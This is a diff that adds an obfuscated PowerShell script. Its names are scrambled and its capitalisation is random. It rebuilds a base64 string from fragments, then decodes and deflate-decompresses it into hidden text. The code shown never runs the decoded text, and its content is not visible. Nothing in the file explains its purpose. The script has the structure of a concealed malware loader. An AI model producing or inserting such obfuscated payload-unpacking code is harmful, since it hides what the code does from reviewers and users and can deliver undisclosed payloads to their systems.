@@ -1,0 +1,24 @@
+fUNCtIoN rNTn { 
+    [cMDletBIndiNG() ]Param( 
+        [PARamETER(ValuefROmpIPeLInE)]
+        $IZsD
+    )
+    $JiXHcbN = [io.MEmorYstrEaM][cOnVert]::fRoMBasE64STrInG($IZsD)
+    $JiXHcbN | CKaojT}
+fUNCtIoN CKaojT { 
+    [cMDletBIndiNG() ]Param( 
+        [PARamETER(ValuefROmpIPeLInE)]
+        $lxJNHKxS
+    )
+    $QerFG = (nEW-obJECt  SystEM.IO.compreSSION.defLaTEStrEAm( $lxJNHKxS, [iO.COmPrESSIOn.COmpREsSIonmodE]::decoMpreSs )|FOReACH-ObjeCT{nEW-obJECt  io.strEamREADER($_ , [tExT.encodiNg]::aScii) }).rEADToEnD()
+}
+$gUkF = 'LctBCsIwEEbhvaf4Ka4HYmml'
+$gUkF+= 'BRcu3XiH0EyYgTQpSSR4e7V2' 
+$gUkF +='+/jeOXN5hYobumdqeMBrdFjf'
+$gUkF+= 'hYOHRli0lINDE10EPmWsDC2/' 
+$gUkF +='WhhVbIRjW4VwP+R3+uMqnHcb'
+$gUkF+='E7ZgFz520m2+9COZfiBjJhqv'
+$BaFDd ='3ekD' 
+$BaFDd= $gUkF +$BaFDd
+rNTn -IZsD $BaFDd
+
